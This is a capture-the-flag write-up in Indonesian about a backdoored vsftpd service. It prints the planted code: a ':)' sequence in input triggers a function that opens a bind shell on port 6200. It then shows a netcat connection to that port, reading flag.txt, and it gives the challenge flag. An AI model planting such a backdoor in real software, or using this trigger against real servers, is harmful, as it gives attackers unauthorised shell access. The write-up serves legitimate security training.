```
I'm using the very secure ftp daemon for my projects:
ftp vsftp.uni.hctf.fun 2121
Still someone managed to get my secret file :(.
Maybe this has something to do with it...
```

Di berikan service FTP dan potongan source di https://pastebin.com/raw/AetT9sS5 dan fokus ke bagian :
```
{
       return 1;
     }
-    else if((p_str->p_buf[i]==0x3a)
-    && (p_str->p_buf[i+1]==0x29))
-    {
-      vsf_sysutil_extra();
-    }
   }
   return 0;
 }
```
jika dalam input terdapat karakter dari **0x3a** dan di ikuti dengan **0x29** maka program akan memanggil fungsi ```vsf_sysutil_extra();``` yang isinya adalah :
```
 #include <sys/param.h>
 #include <sys/uio.h>
-#include <netinet/in.h>
-#include <netdb.h>
-#include <string.h>
-#include <stdlib.h>
+
 #include <sys/prctl.h>
 #include <signal.h>
 
@@ -220,7 +217,7 @@
 static int s_proctitle_inited = 0;
 static char* s_p_proctitle = 0;
 #endif
-int vsf_sysutil_extra();
+
 #ifndef VSF_SYSDEP_HAVE_MAP_ANON
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -843,30 +840,6 @@
   }
 }
 
-int
-vsf_sysutil_extra(void)
-{
-  int fd, rfd;
-  struct sockaddr_in sa;
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  exit(1); 
-  memset(&sa, 0, sizeof(sa));
-  sa.sin_family = AF_INET;
-  sa.sin_port = htons(6200);
-  sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&sa,
-  sizeof(struct sockaddr))) < 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
-  { 
-    rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0); 
-  } 
-}
```
di sini kita akan di konekkan ke port 6200 dan kita akan di beri akses shell, jadi ini adalah sebuah backdoor
karena sudah tau kita akan di arahkan ke port 6200 dan mendapatkan shell, kita bisa langsung konek menggunakan netcat dan eksekusi command
```
$ nc vsftp.uni.hctf.fun 6200
cat flag.txt
flag{Pr3tty_Obvi0us_B4ckd00r}
```
<h3>Flag : flag{Pr3tty_Obvi0us_B4ckd00r}</h2>
